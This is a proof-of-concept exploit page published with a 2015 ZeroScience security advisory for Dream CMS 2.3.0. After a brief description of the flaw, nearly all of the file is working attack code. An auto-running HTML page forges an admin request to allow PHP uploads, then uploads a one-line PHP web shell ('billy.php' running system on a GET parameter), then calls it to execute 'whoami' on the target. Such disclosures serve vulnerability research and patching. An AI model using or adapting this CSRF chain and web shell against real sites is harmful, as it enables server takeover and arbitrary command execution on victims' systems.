@@ -1,0 +1,125 @@
+﻿<!--
+
+Dream CMS 2.3.0 CSRF Add Extension And File Upload PHP Code Execution
+
+
+Vendor: Dream CMS
+Product web page: http://www.dream-cms.kg
+Affected version: 2.3.0
+
+Summary: DreamCMS is open and completely free PHP web application
+for constructing websites of any complexity.
+
+Desc: Dream CMS allows users to perform certain actions via HTTP requests
+without performing any validity checks to verify the requests. This can be
+exploited to perform certain actions with administrative privileges if a
+logged-in user visits a malicious web site. Related to the CSRF issue, an
+authenticated arbitrary PHP code execution exist. The vulnerability is caused
+due to the improper verification of uploaded files in '/files-manager-administration/add-file'
+script via the 'file' POST parameter which allows of arbitrary files being
+uploaded in '/resource/filemanager/1/home/' where the admin first needs to add
+the file extension in the allowed list (csrf'd). This can be exploited to execute
+arbitrary PHP code by uploading a malicious PHP script file and execute system
+commands.
+
+Tested on: nginx/1.6.2
+           PHP/5.5.28
+		   
+		   
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+							
+							
+Advisory ID: ZSL-2015-5268
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5268.php
+
+
+01.10.2015
+
+-->
+
+
+<html>
+<head>
+<title>Dream CMS 2.3.0 CSRF Add Extension And File Upload PHP Code Execution</title>
+</head>
+
+<body onload="exploitrun();">
+
+<!-- 1. Add PHP allowed extension -->
+<form name="addext" action="http://TARGET/pages/en/files-manager-administration/settings" method="POST" target="frame0">
+<input type="hidden" name="form&#95;name" value="settings" />
+<input type="hidden" name="file&#95;manager&#95;allowed&#95;extensions" value="bmp&#44;gif&#44;jpg&#44;png&#44;mp3&#44;wav&#44;wma&#44;3g2&#44;3gp&#44;avi&#44;flv&#44;mov&#44;mp4&#44;mpg&#44;swf&#44;vob&#44;wmv&#44;zip&#44;rar&#44;txt&#44;doc&#44;docx&#44;pdf&#44;php" />
+<input type="hidden" name="file&#95;manager&#95;allowed&#95;size" value="2097152" />
+<input type="hidden" name="file&#95;manager&#95;file&#95;name&#95;length" value="20" />
+<input type="hidden" name="file&#95;manager&#95;image&#95;extensions" value="bmp&#44;gif&#44;jpg&#44;png" />
+<input type="hidden" name="file&#95;manager&#95;media&#95;extensions" value="mp3&#44;wav&#44;wma&#44;3g2&#44;3gp&#44;avi&#44;flv&#44;mov&#44;mp4&#44;mpg&#44;swf&#44;vob&#44;wmv" />
+<input type="hidden" name="file&#95;manager&#95;window&#95;width" value="60" />
+<input type="hidden" name="file&#95;manager&#95;window&#95;height" value="500" />
+<input type="hidden" name="file&#95;manager&#95;window&#95;image&#95;height" value="300" />
+<input type="hidden" name="submit" value="Save" />
+</form>
+
+<!-- 2. Upload PHP file -->
+<script>
+function upload()
+{
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://TARGET/pages/en/files-manager-administration/add-file?path=home", true);
+    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
+    xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundaryuCEcIcPhpF3WD8Sv");
+    xhr.withCredentials = true;
+    var body = "------WebKitFormBoundaryuCEcIcPhpF3WD8Sv\r\n" + 
+               "Content-Disposition: form-data; name=\"form_name\"\r\n" + 
+               "\r\n" + 
+               "file\r\n" + 
+               "------WebKitFormBoundaryuCEcIcPhpF3WD8Sv\r\n" + 
+               "Content-Disposition: form-data; name=\"file\"; filename=\"billy.php\"\r\n" + 
+               "Content-Type: application/octet-stream\r\n" + 
+               "\r\n" + 
+               "\x3c?php\r\n" + 
+               "system($_GET[\"cmd\"]);\r\n" + 
+               "?\x3e\r\n" + 
+               "\r\n" + 
+               "------WebKitFormBoundaryuCEcIcPhpF3WD8Sv\r\n" + 
+               "Content-Disposition: form-data; name=\"submit\"\r\n" + 
+               "\r\n" + 
+               "Submit\r\n" + 
+               "------WebKitFormBoundaryuCEcIcPhpF3WD8Sv--\r\n";
+    var aBody = new Uint8Array(body.length);
+    for (var i = 0; i < aBody.length; i++)
+      aBody[i] = body.charCodeAt(i); 
+    xhr.send(new Blob([aBody]));
+}
+</script>
+
+<form name="uploadme" action="javascript:upload();" target="frame1">
+</form>
+
+<!-- 3. Code execution -->
+<form name="exploit" action="http://TARGET/resource/filemanager/1/home/billy.php" method="GET" target="frame2">
+<input type="hidden" name="cmd" value="whoami" />
+</form>
+
+<iframe name="frame0"></iframe>
+<iframe name="frame1"></iframe>
+<iframe name="frame2"></iframe>
+
+<script>
+function exploitrun()
+{
+    document.addext.submit();
+    document.getElementsByTagName("iframe")[0].onload = function()
+    {
+        document.uploadme.submit();
+        document.getElementsByTagName("iframe")[1].onload = function()
+        {
+            document.exploit.submit();
+        }
+    }
+}
+</script>
+
+</body>
+</html>
